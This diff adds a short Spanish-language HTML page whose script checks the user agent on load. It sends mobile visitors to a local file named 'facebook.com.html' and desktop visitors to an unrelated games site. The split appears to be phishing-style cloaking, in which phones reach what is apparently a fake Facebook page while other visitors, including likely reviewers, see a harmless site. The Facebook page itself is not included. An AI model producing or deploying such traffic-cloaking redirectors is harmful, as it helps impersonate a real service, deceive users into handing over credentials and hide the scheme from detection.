@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirección de tráfico</title>
+</head>
+<body>
+
+<script>
+  // Función para redirigir según el dispositivo
+  function redirigirSegunDispositivo() {
+    // Verificar si es un dispositivo móvil
+    if (/Mobi|Android/i.test(navigator.userAgent)) {
+      // Redirigir a la URL para dispositivos móviles
+      window.location.href = './facebook.com.html';
+    } else {
+      // Redirigir a la URL para otros dispositivos (puedes ajustar esto según sea necesario)
+      window.location.href = 'https://frvr.com/';
+    }
+  }
+
+  // Llamar a la función de redirección al cargar la página
+  redirigirSegunDispositivo();
+</script>
+
+</body>
+</html>
